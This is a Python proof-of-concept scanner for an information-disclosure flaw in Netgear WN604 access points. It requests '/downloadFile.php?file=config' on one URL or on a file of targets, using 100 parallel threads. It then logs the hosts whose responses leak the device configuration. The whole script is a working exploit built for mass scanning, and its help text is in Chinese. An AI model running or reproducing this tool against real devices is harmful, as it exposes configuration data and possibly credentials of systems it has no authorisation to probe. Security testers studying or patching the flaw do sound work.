import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test ="""███╗   ██╗███████╗████████╗ ██████╗ ███████╗ █████╗ ██████╗       ██╗    ██╗███╗   ██╗ ██████╗  ██████╗ ██╗  ██╗
████╗  ██║██╔════╝╚══██╔══╝██╔════╝ ██╔════╝██╔══██╗██╔══██╗      ██║    ██║████╗  ██║██╔════╝ ██╔═████╗██║  ██║
██╔██╗ ██║█████╗     ██║   ██║  ███╗█████╗  ███████║██████╔╝█████╗██║ █╗ ██║██╔██╗ ██║███████╗ ██║██╔██║███████║
██║╚██╗██║██╔══╝     ██║   ██║   ██║██╔══╝  ██╔══██║██╔══██╗╚════╝██║███╗██║██║╚██╗██║██╔═══██╗████╔╝██║╚════██║
██║ ╚████║███████╗   ██║   ╚██████╔╝███████╗██║  ██║██║  ██║      ╚███╔███╔╝██║ ╚████║╚██████╔╝╚██████╔╝     ██║
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝       ╚══╝╚══╝ ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝      ╚═╝
                                                                                                                

"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="Netgear WN604信息泄露")
    parse.add_argument('-u','--url',dest='url',type=str,help="Please input your URL")
    parse.add_argument('-f','--file',dest="file",type=str,help="Please input your File path")
    parse.add_argument('-t','--txt',dest="txt",type=str,help="Please input your Filename")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url,args.txt)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.starmap(poc, [(url, args.txt)for url in url_list])
        mp.close()
        mp.join()
    else:
        print(f"Uage:\n\t python3 {sys.argv[0]} -h")

def poc(target,filename):
    payload = "/downloadFile.php?file=config"
    try:
        res1 = requests.get(url=target+payload)
        if 'system' in res1.text:
            print(f"[+]{target}存在漏洞")
            with open(filename,'a')as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target}不存在漏洞")
    except:
        pass

if __name__ == "__main__":
    main()
